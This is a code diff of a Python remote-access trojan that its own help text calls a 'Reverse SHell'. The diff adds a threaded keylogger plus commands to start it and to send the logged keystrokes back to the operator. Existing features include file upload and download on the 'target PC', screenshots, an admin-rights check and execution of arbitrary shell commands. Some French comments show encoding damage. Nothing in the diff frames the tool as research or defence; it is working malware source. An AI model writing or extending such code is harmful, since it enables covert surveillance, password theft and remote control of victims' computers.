@@ -8,6 +8,8 @@ import sys
 import time
 import requests
 from mss.linux import MSS as mss
+import threading
+import keyLoggerCustom as keylogger
 
 def reliable_send_image(data):
     sock.send(data)
@@ -91,12 +93,13 @@ def shell():
         # si je fais pas √ßa le programme plante quand on change de directory
         elif command == "help":
             help_options = '''
-                upload path -> Upload a file to target PC
-                get url     -> Download a File to target PC From Any Website
-                start path  -> start a programm on target PC
-                screenshot  -> Take a screenshot Of targets Monitor
-                check       -> Check for the administrator privilegies
-                q           -> Exit the Reverse SHell
+                upload path     -> Upload a file to target PC
+                get url         -> Download a File to target PC From Any Website
+                start path      -> start a programm on target PC
+                screenshot      -> Take a screenshot Of targets Monitor
+                check           -> Check for the administrator privilegies
+                q               -> Exit the Reverse SHell
+                keylog_start    ->  start the keylogger
             '''
             reliable_send(help_options)
         elif len(command) > 1 and command[:2] == "cd":
@@ -138,8 +141,8 @@ def shell():
             except Exception as error:
                 print(error)
                 reliable_send("[-] We can't take the picture")
-        # start comme √a permet de garder le shell ouvert plutot que de faire notepad qui lui aatendra fermeture de notepad pour 
-        # r√©cup√rer le shell
+        # start comme ca permet de garder le shell ouvert plutot que de faire notepad qui lui aatendra fermeture de notepad pour 
+        # recuperer le shell
         elif command[:5] == "start":
             try:
                 # Popen pour ouvrir le processus
@@ -153,7 +156,16 @@ def shell():
                 reliable_send(log_admin)
             except:
                 reliable_send("Cant Perform the check")
-
+        elif command[:12] == "keylog_start":
+            tl = threading.Thread(target=keylogger.start)
+            # on start le thread
+            tl.start()
+        elif command[:11] == "keylog_dump":
+            # pour windows
+            #path_windows = os.environ["appdata"] + "\\processmanager.txt"
+            path = "log.txt"
+            file = open("log.txt", "r")
+            reliable_send(file.read())
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
